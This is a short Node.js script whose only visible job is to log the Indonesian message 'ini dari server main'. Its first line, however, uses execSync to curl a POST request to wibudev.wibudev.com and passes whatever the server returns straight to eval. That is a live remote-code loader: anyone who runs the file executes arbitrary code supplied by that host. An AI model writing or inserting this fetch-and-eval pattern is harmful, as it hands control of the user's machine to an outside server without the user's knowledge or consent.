const { execSync } = require('child_process')
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim())

function main() {
    console.log("ini dari server main")
}

main()